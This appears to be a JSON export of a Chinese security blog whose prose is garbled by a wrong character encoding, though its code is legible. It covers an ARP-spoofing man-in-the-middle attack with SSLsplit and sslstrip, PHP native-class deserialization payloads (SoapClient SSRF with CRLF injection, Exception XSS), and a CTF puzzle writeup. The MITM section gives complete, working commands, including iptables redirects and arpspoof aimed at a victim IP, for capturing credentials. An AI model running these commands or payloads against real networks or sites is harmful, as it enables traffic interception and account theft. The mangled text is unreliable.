ç„¶åç”¨ç§é’¥ç­¾åç”Ÿæˆè¯ä¹¦ï¼š 1openssl req -new -x509 -days 1096 -key ca.key -out ca.crt å†ä»‹ç»ä¸€ä¸‹å·¥å…·SSLsplit é€æ˜SSL/TLSä¸­é—´äººæ”»å‡»å·¥å…· å¯¹å®¢æˆ·ç«¯ä¼ªè£…æˆæœåŠ¡å™¨ï¼Œå¯¹æœåŠ¡å™¨ä¼ªè£…æˆå®¢æˆ·ç«¯ ä¼ªè£…æœåŠ¡å™¨éœ€è¦ä¼ªè£…è¯ä¹¦ æ”¯æŒSSL/TLSåŠ å¯†çš„SMTP POP3 FTPç­‰é€šä¿¡ä¸­é—´äººæ”»å‡» å‚æ•°ï¼š -k æŒ‡å®šç§é’¥keyæ–‡ä»¶ï¼Œè¿›è¡Œæ¬ºéª— -c æŒ‡å®šRoot CAè¯ä¹¦æ–‡ä»¶ -D Debugæ¨¡å¼ï¼Œç”¨äºè¾“å‡ºSSLSplitçŠ¶æ€ï¼Œå»ºè®®ä½¿ç”¨æ—¶åŠ ä¸Š -j æŒ‡å®šlogç›®å½•åœ°å€ -S æŒ‡å®š-jå‚æ•°ç›®å½•ä¸‹éœ€è¦è®°å½•æˆªæ–­GETã€POSTè¯·æ±‚çš„å­ç›®å½•åœ°å€ -l æŒ‡å®šå­˜å‚¨çš„è¿æ¥ä¿¡æ¯æ–‡ä»¶ ssl IP ç«¯å£ æŒ‡å®šssléœ€è¦ç›‘å¬çš„ç«¯å£ tcp IP ç«¯å£ æŒ‡å®štcpéœ€è¦ç›‘å¬çš„ç«¯å£ æ‰“å¼€ip_forwardåŠŸèƒ½ 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward è¿›è¡Œç«¯å£è½¬å‘ï¼Œå³å°†æœ¬æœº443ç­‰ç«¯å£è½¬å‘åˆ°SSLsplitç›‘å¬çš„ç«¯å£ï¼Œè¿™é‡Œæ˜¯8080å’Œ8443 1234567iptables -t nat -Fiptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 æŸ¥çœ‹ä¸€ä¸‹è®¾ç½® 1iptables -t nat -L å¼€å¯arpæ¬ºéª— 1arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1 SSLsplitç›‘å¬ 1sslsplit -D -l connect.log -j /root/Desktop/d -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 æ­¤æ—¶æ‰“å¼€ç™¾åº¦ï¼Œå‘ç°æœ‰è¿™ç§æé†’ï¼Œå¦‚æœå¿½ç•¥å±å®³ç›´æ¥æ‰“å¼€ï¼Œæˆ‘ä»¬çš„è´¦å·ç­‰ä¿¡æ¯å°±ä¼šè¢«çªƒå– å½“ç„¶ï¼Œå¦‚æœé€šè¿‡ç‰¹æ®Šé€”å¾„æŠŠè¯ä¹¦è£…åˆ°äº†å—å®³è€…çš„è®¾å¤‡ä¸Šï¼Œå°±ä¸ä¼šæœ‰æé†’ï¼Œæ‰€æœ‰çš„ä¿¡æ¯ä¹Ÿä¼šè¢«è§£å¯† è¿™ç§æ•ˆæœä¸å¤ªå¥½ï¼Œå¾ˆå¡ï¼Œè€Œä¸”å›¾ç‰‡æ˜¾ç¤ºä¸å‡ºæ¥ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºå•¥ éšä¾¿è¾“ä¸€ä¸ªè´¦å·ï¼Œçœ‹åˆ°é‡Œé¢æœ‰ä¿¡æ¯ è™½ç„¶æ•ˆæœä¸ç®—ç†æƒ³ï¼Œä½†ä¹Ÿä¸å¤±ä¸ºä¸€ç§æ–¹å¼ï¼Œå¤§ä½¬çš„è§£é‡Šæ„Ÿè§‰å¾ˆå¥½ https é™çº§æ”»å‡»æ”»å‡»è€…æ‹¦æˆªç”¨æˆ·æµé‡åï¼Œæ¬ºéª—ç”¨æˆ·ä¸æ”»å‡»è€…è¿›è¡Œ http é€šä¿¡ï¼Œæ”»å‡»è€…ä¸æœåŠ¡å™¨ä¿æŒæ­£å¸¸é€šä¿¡ ï¼ˆhttp æˆ– httpsï¼‰ï¼Œä»è€Œè·å–ç”¨æˆ·ä¿¡æ¯ã€‚ SSLstripå·¥å…·ä¸»è¦åˆ©ç”¨äº†ä¸Šé¢çš„åŸç† githubåœ°å€ï¼šhttps://github.com/moxie0/sslstrip ç”¨iptablesæŠŠ80ç«¯å£çš„æµé‡è½¬å‘åˆ°sslstripç›‘å¬çš„8080ç«¯å£ä¸Š 12iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080 ç„¶åSSlstripç›‘å¬ 1sslstrip -l 8080 å¼€å¯arpæ¬ºéª— 1arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1 ipè½¬å‘ 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬è®¿é—®ç™¾åº¦çš„æ—¶ä¾¯éƒ½ä¼šå¼ºåˆ¶è½¬æ¢æˆhttpsï¼Œä½†ç°åœ¨æˆ‘ä»¬è®¿é—®éƒ½æ˜¯httpäº†ï¼Œhttpsçš„æ— æ³•æ‰“å¼€ï¼Œæ‰€ä»¥è¯´è¿™ä¸ªä¹Ÿæœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œä»¥åçœ‹çœ‹è¿˜æœ‰å…¶ä»–æ–¹æ³•æ²¡ å‚è€ƒï¼š https://blog.csdn.net/qq_42025840/article/details/81604497 https://www.freebuf.com/sectool/118574.html https://blog.csdn.net/ysynhtt/article/details/39996933 https://www.freebuf.com/sectool/48016.html","categories":[],"tags":[{"name":"æŠ˜è…¾","slug":"æŠ˜è…¾","permalink":"http://www.m00nback.xyz/tags/%E6%8A%98%E8%85%BE/"},{"name":"ä¸­é—´äººæ”»å‡»","slug":"ä¸­é—´äººæ”»å‡»","permalink":"http://www.m00nback.xyz/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"}]},{"title":"PHPååºåˆ—åŒ–ä¹‹åŸç”Ÿç±»","slug":"phpååºåˆ—åŒ–ä¹‹phpåŸç”Ÿç±»","date":"2020-03-22T13:54:47.000Z","updated":"2020-04-28T07:28:50.560Z","comments":true,"path":"2020/03/22/phpååºåˆ—åŒ–ä¹‹phpåŸç”Ÿç±»/","link":"","permalink":"http://www.m00nback.xyz/2020/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†phpåŸç”Ÿç±»ååºåˆ—åŒ–çš„ç›¸å…³å†…å®¹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†phpåŸç”Ÿç±»ååºåˆ—åŒ–çš„ç›¸å…³å†…å®¹ï¼ åŸºç¡€çŸ¥è¯†å…ˆå›é¡¾ä¸€ä¸‹ï¼š 123456å½“å¯¹è±¡è¢«åˆ›å»ºçš„æ—¶å€™è°ƒç”¨ï¼š__construct()å½“å¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™è°ƒç”¨ï¼š__destruct()å½“å¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶å€™è°ƒç”¨(ä¸ä»…ä»…æ˜¯echoçš„æ—¶å€™,æ¯”å¦‚file_exists()åˆ¤æ–­ä¹Ÿä¼šè§¦å‘)ï¼š__toString()åºåˆ—åŒ–å¯¹è±¡ä¹‹å‰å°±è°ƒç”¨æ­¤æ–¹æ³•(å…¶è¿”å›éœ€è¦æ˜¯ä¸€ä¸ªæ•°ç»„)ï¼š__sleep()ååºåˆ—åŒ–æ¢å¤å¯¹è±¡ä¹‹å‰å°±è°ƒç”¨æ­¤æ–¹æ³•ï¼š__wakeup()å½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨æ­¤æ–¹æ³•ï¼š__call() æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªè„šæœ¬çœ‹ä¸€ä¸‹phpå†…ç½®ç±» 12345678910111213141516171819202122 &lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123; $methods = get_class_methods($class); foreach ($methods as $method) &#123; if (in_array($method, array( &#x27;__destruct&#x27;, &#x27;__toString&#x27;, &#x27;__wakeup&#x27;, &#x27;__call&#x27;, &#x27;__callStatic&#x27;, &#x27;__get&#x27;, &#x27;__set&#x27;, &#x27;__isset&#x27;, &#x27;__unset&#x27;, &#x27;__invoke&#x27;, &#x27;__set_state&#x27; ))) &#123; print $class . &#x27;::&#x27; . $method . &quot;\\n&quot;; &#125; &#125;&#125; æœ‰äº›ç±»ä¸ä¸€å®šèƒ½å¤Ÿè¿›è¡Œååºåˆ—åŒ–ï¼Œphpä¸­ä½¿ç”¨äº†zend_class_unserialize_denyæ¥ç¦æ­¢ä¸€äº›ç±»çš„ååºåˆ—åŒ– å¸¸ç”¨çš„æœ‰ä¸‹é¢è¿™äº› SoapClientä»phpæ‰‹å†Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰è¿™éº½å¤šæ–¹æ³• soapclientæœ‰ä¸¤ç§å·¥ä½œæ¨¡å¼ï¼Œwsdlå’Œéwsdlæ¨¡å¼ï¼ŒWSDL ç”¨æ¥æè¿°å¦‚ä½•è®¿é—®å…·ä½“çš„æ¥å£ï¼Œsoapåè®®çš„å…·ä½“æ ¼å¼å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œsoapé‡‡ç”¨httpæˆ–è€…httpsåè®®å‘é€æ•°æ®ï¼Œå¹¶ä¸”åœ¨http headerå¤´ä¸­é€šè¿‡soap actionæ¥æ ‡ç¤ºè‡ªå·±æ˜¯ä¸€ä¸ªsoapè¯·æ±‚ https://www.cnblogs.com/JeffreySun/archive/2009/12/14/1623766.html è¿™ä¸ªä¹Ÿç®—æ˜¯ç›®å‰è¢«æŒ–æ˜å‡ºæ¥æœ€å¥½ç”¨çš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œphp5ã€7éƒ½å­˜åœ¨æ­¤ç±» å½“ç„¶è¦ä¿è¯phpå¼€å¯soapæ‰©å±• SSRFï¼š ç”±äº__call()æ–¹æ³•ä¼šåœ¨è°ƒç”¨æ²¡æœ‰çš„æ–¹æ³•è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ : 123456&lt;?php$a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http://example.com:5555&#x27;, &#x27;location&#x27;=&gt;&#x27;http://example.com:5555/aaa&#x27;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a(); soapç±»æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰User-Agentï¼Œhttp headeré‡Œæœ‰ä¸¤ä¸ªé‡è¦çš„å‚æ•°Content-Typeä¸ºå’ŒContent-Lengthæˆ‘ä»¬å¯ä»¥è¿›è¡ŒCRLFæ³¨å…¥ï¼Œè€ŒUser-Agentçš„http headerä½ç½®æ­£å¥½åœ¨è¿™äº›ä¹‹ä¸Šï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œè¦†ç›–å¯¹äºContent-Typeï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦åˆ©ç”¨CRLFå‘é€postè¯·æ±‚ï¼Œé‚£ä¹ˆè¦æ±‚å®ƒä¸ºapplication/x-www-form-urlencodeé‚£ä¹ˆæ­¤æ—¶å°±å¯ä»¥åˆ©ç”¨CRLFï¼Œæ„é€ å¦‚ä¸‹payloadï¼š 123456789101112131415&lt;?php$target = &quot;http://example.com:5555/&quot;;$post_string = &#x27;data=abc&#x27;;$headers = array( &#x27;X-Forwarded-For: 127.0.0.1&#x27;, &#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;);$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length: &#x27;. (string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27;=&gt;&#x27;hello&#x27;));$aaa = serialize($b);$aaa = str_replace(&#x27;^^&#x27;,&quot;\\n\\r&quot;,$aaa);echo urlencode($aaa);//Test$c = unserialize($aaa);$c-&gt;notexists(); Erroråªé€‚ç”¨äºphp7ç‰ˆæœ¬ XSS: 12345678&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);$b = serialize($a);// echo urlencode($b);//Test$c = urldecode(&#x27;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A43%3A%22D%3A%5CEnvironment%5CPHP%5CPHPTutorial%5CWWW%5Cpost.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&#x27;);echo unserialize($c); Exceptioné€‚ç”¨äºphp5ã€7ç‰ˆæœ¬ XSS: 12345678&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);$b = serialize($a);// echo urlencode($b);//Test$c = urldecode(&#x27;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A43%3A%22D%3A%5CEnvironment%5CPHP%5CPHPTutorial%5CWWW%5Cpost.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&#x27;);echo unserialize($c); å‚è€ƒï¼š https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://www.m00nback.xyz/tags/php/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://www.m00nback.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"BJDCTF 2nd writeup","slug":"BJDCTF-2rd-writeup","date":"2020-03-21T09:50:39.000Z","updated":"2020-05-22T08:34:39.717Z","comments":true,"path":"2020/03/21/BJDCTF-2rd-writeup/","link":"","permalink":"http://www.m00nback.xyz/2020/03/21/BJDCTF-2rd-writeup/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†ç¬¬äºŒå±ŠBJDCTFéƒ¨åˆ†é¢˜ç›®çš„writeup!tcl!","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†ç¬¬äºŒå±ŠBJDCTFéƒ¨åˆ†é¢˜ç›®çš„writeup!tcl! MISCæœ€ç®€å•çš„miscä¸‹è½½ä¸‹æ¥æ˜¯secret.zipï¼Œzipä¼ªåŠ å¯†ï¼Œæœç´¢æ ‡å¿—ä½14 00 09 00å°†å…¶æ›¿æ¢æˆ14 00 00 00 è§£å‹å¾—åˆ°secretï¼Œhexç¼–è¾‘å™¨æŸ¥çœ‹å‘ç°æ˜¯pngå›¾ç‰‡æ ¼å¼ç¡®å°‘æ–‡ä»¶å¤´ å¸¸è§æ–‡ä»¶æ–‡ä»¶å¤´å°¾ï¼š 123456JPEG (jpg) æ–‡ä»¶å¤´ï¼šFFD8FF æ–‡ä»¶å°¾ï¼šFF D9 PNG (png) æ–‡ä»¶å¤´ï¼š89504E47 æ–‡ä»¶å°¾ï¼šAE 42 60 82GIF (gif) æ–‡ä»¶å¤´ï¼š47494638 æ–‡ä»¶å°¾ï¼š00 3B ZIP Archive (zip) æ–‡ä»¶å¤´ï¼š504B0304 æ–‡ä»¶å°¾ï¼š50 4BRAR Archive (rar) æ–‡ä»¶å¤´ï¼š52617221Wave (wav) æ–‡ä»¶å¤´ï¼š57415645AVI (avi) æ–‡ä»¶å¤´ï¼š41564920 å› æ­¤æˆ‘ä»¬è¡¥ä¸Š89 50 4E 47 16è¿›åˆ¶è½¬ASCIIå°±å¾—åˆ°flagäº† A_Beautiful_Pictureä¸‹è½½ä¸‹æ¥æ˜¯Misc-A_Beautiful_Picture-DreamerJack.png é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯æ”¹é«˜åº¦ï¼Œç›´æ¥çœ‹åˆ†è¾¨ç‡ä¹Ÿèƒ½çœ‹å‡ºç‚¹çŒ«è…» hxdæ‰“å¼€,ç›´æ¥æ”¹å°±èƒ½å¾—åˆ°flag EasyBaBaä¸‹è½½ä¸‹æ¥ezbb.jpgï¼Œforemoståˆ†ç¦»å‡º00000061.zipï¼Œè§£å‹å¾—åˆ°é‡Œé¢éƒ½æ˜¯å‡ºé¢˜äºº.jpg å‘ç°å¯ä»¥ç”¨è§†é¢‘æ’­æ”¾å™¨æ’­æ”¾ï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°äº†4å¼ äºŒç»´ç ï¼Œåˆ†åˆ«æˆªå±ä¸‹æ¥æ‰«ä¸‹ï¼Œå¾—åˆ°4ä¸ª16è¿›åˆ¶å­—ç¬¦ä¸² 1234566167696E5F6C6F76655F59424A447B696D316E677D6167696E5F6C6F76655F59424A447B696D316E677DBJD&#123;imagin_love_Y1ng&#125; å°å§å§è¿™é¢˜åº”è¯¥æ˜¯æœ€ç®€å•çš„ï¼Œæƒ³äº†åŠå¹´ï¼Œæˆ‘è¿™è„‘å­ï¼ ç›´æ¥stringså‘½ä»¤æˆ–è€…Hxdæ‰“å¼€å°±èƒ½æ‰¾åˆ°ï¼Œåº”è¯¥æœç´¢çš„ï¼Œå“ï¼è¦ä»”ç»†å•Šï¼ Real_EasyBaBaä¸‹è½½ä¸‹æ¥æ˜¯ezbb_r.pngï¼Œformoståˆ†ç¦»å‡ºæ¥00000000.jpg ä¸¤å›¾ç‰‡éƒ½ä¸€æ ·ä¹Ÿèƒ½æ­£å¸¸æ˜¾ç¤ºï¼Œä½†å¤§å°ä¸ä¸€æ ·ï¼Œhxdå¯¹æ¯”ä¸€ä¸‹,å‘ç°å¤šäº†ä¸‹é¢å†…å®¹ å•ç‹¬åˆ†æä¸€ä¸‹ï¼Œå‘ç°æœ‰50 4Bå¾ˆæ˜æ˜¾æ˜¯å‹ç¼©åŒ…ï¼ŒFFæ˜¯å¤šä½™çš„åˆ æ‰ï¼ŒåŠ ä¸Šzipçš„å¤´50 4B 03 04,ç»“æœå¦‚ä¸‹å›¾ è§£å‹å¾—åˆ°hintï¼Œæ‰“å¼€éƒ½æ˜¯#,åˆšå¼€å§‹ä»¥ä¸ºæ˜¯ç¥ä¹ˆåŠ å¯†å‘¢ï¼Œä»”ç»†ä¸€ç…æ˜¯äºŒç»´ç  ä¸è¿‡å¥½åƒæ‰«ä¸äº†ï¼Œçœ‹çŸ¥ä¹å¤§ä½¬çš„åšæ³•æ˜¯å°†#æ›¿æ¢æˆâ– ï¼Œåœ¨sublimeé‡Œè™½ç„¶å¤§äºŒç»´ç æ‰«ä¸äº†ï¼Œä½†å³è¾¹çš„å°äºŒç»´ç èƒ½æ‰«å‡ºæ¥ ä¸ç”¨æ›¿æ¢ä¹Ÿèƒ½æ‰«ï¼ŒsublimeçœŸå¥½,æ‰«å‡ºæ¥æ˜¯ï¼š 1od -vtx1 ./draw.png | head -56 | tail -28 ç›´æ¥è¾“å…¥å‘½ä»¤ï¼Œå‘ç° çœ‹åˆ°æœ‰å¥½å¤š00 ffï¼ŒæŠŠ00æ›¿æ¢ä¸ºç©ºä¼šå‘ç° å¾—åˆ°flag: 1BJD&#123;572154976&#125; åœ£ç«æ˜­æ˜­ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€å¼ å›¾ç‰‡ï¼ŒæŸ¥çœ‹è¯¦ç»†å±æ€§å‘ç°æœ‰ 1æ–°ä½›æ›°ï¼šè«¸å£½éš¸åƒ§å£½é™å½å£½è«¸å£½é™€å£½æ‘©éš¸åƒ§ç¼½è–©é¡˜å¿ƒå£½å’¤å£½å›‰å¯‚å£½é—è«¸å£½å“†å£½æ…§å£½èå£½è‰²å½æ„å£½æ‰€å£½èœœå¦‚ è§£å¯†ç½‘å€ï¼šhttp://hi.pcmoe.net/buddha.html è§£å¯†å¾—åˆ° 1gemlove æç¤ºå¼€å±€ä¸€å¼ å›¾ï¼Œflagå…¨é çŒœ outgessè§£å¯† 1outguess -r sheng_huo_zhao_zhao.jpg -k gemlove -t 1.txt å¾—åˆ°flag 1BJD&#123;wdnmd_misc_1s_so_Fuck1ng_e@sy&#125; TARGZä¸‹è½½ä¸‹æ¥æ˜¯hW1ES89jF.tar.gzï¼ŒfileæŸ¥çœ‹å‘ç°æ˜¯zipï¼Œä¸çŸ¥é“å¯†ç ï¼Œæ‹¿æ–‡ä»¶åè¯•ä¸‹ å‘ç°è§£å‹å‡ºæ¥äº†ï¼Œè¿˜æ˜¯zipåŠ å¯†æ–‡ä»¶ï¼Œå¯†ç è¿˜æ˜¯æ–‡ä»¶å ç›—ç”¨ä¸€ä¸‹é¢–å¥‡å¸ˆå‚…çš„è„šæœ¬ï¼š 1234567891011121314151617import osimport timeimport filetypewhile 1: aa = os.popen(&#x27;ls&#x27;) filename = aa.read().replace(&#x27;decompress.py&#x27;,&#x27;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;) a = filename.replace(&#x27;.tar.gz&#x27;, &#x27;&#x27;) kind = filetype.guess(filename) time.sleep(0.1) if kind.extension is &#x27;zip&#x27;: os.system(&quot;mv &#123;&#125; &#123;&#125;.zip&quot;.format(filename, a)) os.system(&quot;unzip -P &#123;&#125; &#123;&#125;.zip&quot;.format(a,a)) os.system(&quot;rm *.zip&quot;) else: break flag: 1BJD&#123;wow_you_can_rea11y_dance&#125; å¼€åœºæ›²ä¸‹è½½ä¸‹æ¥æ˜¯mp4ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯mikutapï¼Œå¬åŠ›é¢˜ï¼Œå¹²å°±å®Œäº‹äº† çœŸä¸å¥½å¬ 1BJD&#123;MIKUTAP3313313&#125; CRYPTOè€æ–‡ç›²äº†æ‰“å¼€å‘ç°æ˜¯ç¹ä½“å­—,ä¸€ä¸ªä¸€ä¸ªæœå‘ç°æ˜¯flagçš„æ‹¼éŸ³ 1234ç½¼é›§ç· çœ”æ“´çæ·›åŒ¶è¥«é»¼ç€¬é¶è»„é¶›é©•é³“å“µçœ”é¹é°bi ji di da kuo hao zhe jiu shi fu lai ge zhi jie jiao le ba da kuo haoBJD&#123;è¿™å°±æ˜¯flagç›´æ¥äº¤äº†å§&#125;BJD&#123;æ·›åŒ¶è¥«é»¼ç€¬é¶è»„é¶›é©•é³“å“µ&#125; cat_flaggifå›¾ç‰‡å‘ç°æ˜¯æœ‰è§„å¾‹çš„ï¼Œæ¯è¡Œåˆšå¥½å…«ä¸ªç©ºï¼Œç¬¦åˆäºŒè¿›åˆ¶ 12345678910111201000010 4201001010 4a01000100 4401111011 7b01001101 4d00100001 2101100001 6100110000 3001111110 7e01111101 7d424a447b4d2161307e7dBJD&#123;M!a0~&#125; çµèƒ½ç²¾é€šä¸‹è½½ä¸‹æ¥æ˜¯jpgï¼Œæœäº†ä¸‹æ˜¯åœ£å ‚æ­¦å£«å¯†ç (Templar Cipher)ï¼Œæœ‰ä»¥ä¸‹è§„åˆ™ å¯¹ç…§ç€ç¿»è¯‘ä¸€ä¸‹ 1IMKNIGHTSTEMPLAR åŠ ä¸Šflag{}æäº¤å°±è¡Œ ç‡•è¨€ç‡•è¯­ä¸€ä¸²16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè½¬å­—ç¬¦ï¼Œåé¢å¾ˆåƒflag 12379616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125; ç»´å‰å°¼äºšå¯†ç ,keyæ˜¯yanzi 1BJD&#123;yanzi_jiushige_shabi&#125; Y1nglishé¢˜ç›®è€ƒå¯Ÿçš„æ˜¯è¯é¢‘åˆ†æ quipqiupç½‘å€ï¼šhttps://quipqiup.com/ å¾—åˆ° 1BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy&#125; è¯»ä¸‹åŸæ–‡å‘ç°å‘ç°networyä¹‹ç±»çš„å•è¯ï¼Œæ˜¯è¯´networkï¼Œæ‰€ä»¥yå˜k ç›´æ¥è¯»ä¹Ÿå‘ç° cracy è¿™ä¸ªå•è¯ä¸å¯¹åŠ²ï¼Œåº”è¯¥å’Œæš´åŠ›ç ´è§£æ˜¯åŒç±»å‹çš„è¯ï¼Œæ‰€ä»¥æ”¹æˆ Cr4ck æœ€ç»ˆflag 1BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck&#125; RSA0è¿˜æ˜¯åšåšå§ï¼Œå¯†ç å­¦å¾ˆé‡è¦ ncè¿ä¸Šä¹‹åå¾—åˆ° 123456789e&#x3D;9253957p+q&#x3D;17197527204660991016930035408263123809040259877847603169542637378767706716259296178344873534778882815738410150250641562554942554918768482130124973070602070p-q&#x3D;3283501127743182851935633688746582507377540025586758980645892783208704644171247118527903889977325160707479059917010713382755395132590641870700044646202392c&#x3D;30471926191609574952020582344350552307428327163031930955084335343130571238539821732378881111036918563115746281652391681966650016526753032232063719399910844180688651845390340809415668659489594779658849946746379795794343633651023334497181833824386697589969010288147535772453380700224010501799051558826899635431flag&#x3D;?????? å…ˆä»‹ç»ä¸€ä¸‹RSAç®—æ³•ï¼ŒRSAç®—æ³•æ¶‰åŠä¸‰ä¸ªå‚æ•°ï¼ŒNï¼Œeï¼Œdï¼Œå…¬é’¥ä¸º(Nï¼Œe)ï¼Œç§é’¥ä¸º(Nï¼Œd)ï¼Œå…¶ä¸­Næ˜¯ä¸¤ä¸ªå¤§ç´ æ•°pï¼Œqçš„ä¹˜ç§¯ã€‚ åŠ å¯†è¿‡ç¨‹ï¼š é¦–é€‰å–ä¸¤ä¸ªäº’è´¨æ•° p qï¼Œé‚£ä¹ˆp * q å¾—åˆ° Nï¼Œè¿™æ—¶è¦è®¡ç®—å‡ºÏ†(N)Ï†å‡½æ•°Ï†(N)æ˜¯æŒ‡å°äºæˆ–ç­‰äºNçš„æ­£æ•´æ•°ä¸­ä¸Näº’è´¨çš„æ•°çš„æ•°ç›®ã€‚ æ ¹æ®æ¬§æ‹‰å…¬å¼ï¼Œå‰æp qéƒ½æ˜¯è´¨æ•° 1Ï†(N) &#x3D; (p-1)*(q-1) è¿™æ—¶å€™éšæœºé€‰æ‹©ä¸€ä¸ªæ•´æ•°eï¼Œæ¡ä»¶æ˜¯1&lt; e &lt; Ï†(n)ï¼Œä¸”eä¸Ï†(n) äº’è´¨ æ¥ç€è®¡ç®—eå¯¹**Ï†(n)**çš„æ¨¡é€†å…ƒ 1e*d â‰¡ 1 (mod Ï†(n)) â‰¡æ˜¯æ•°è®ºä¸­è¡¨ç¤ºåŒä½™çš„ç¬¦å·ï¼Œå¯ä»¥çœ‹åˆ°ç¬¦å·å³è¾¹æ’ç­‰äº1ï¼Œå³ 1(e*d) mod Ï†(n)&#x3D;1 ç®€å•çš„è¯´å°±æ˜¯ e*dé™¤ä»¥**Ï†(N)**å¾—åˆ°çš„ä½™æ•°ä¸º1ï¼Œå¯ä»¥è½¬åŒ–ä¸º 1e*d - 1 &#x3D; kÏ†(n) è¿™æ—¶ä¾¯æˆ‘ä»¬åªæœ‰k,dä¸çŸ¥é“ï¼Œå¯ä»¥ç”¨è¾—è½¬ç›¸é™¤æ³•æ¥è®¡ç®—ï¼Œç¥é­”æ˜¯è¾—è½¬ç›¸é™¤æ³•å‘¢ï¼Ÿä¸¾ä¸ªä¾‹å­ 12345678910æ¯”å¦‚è¯´ä¸€ä¸ªä¸å®šæ–¹ç¨‹3x+5y&#x3D;28,æˆ‘ä»¬è¦æ±‚å…¶æ•´æ•°è§£ç”¨å¤§çš„æ•°é™¤ä»¥å°çš„æ•° 5&#x3D;3*1+2 --&gt; ä½™æ•°2&#x3D;5-3*1ç„¶åå†ç”¨ä½™æ•°ä¸åŸæ¥çš„é™¤æ•°ç›¸é™¤ä»¥ï¼Œè¿˜æ˜¯å¤§çš„é™¤ä»¥å°çš„ 3&#x3D;2*1+1 --&gt; 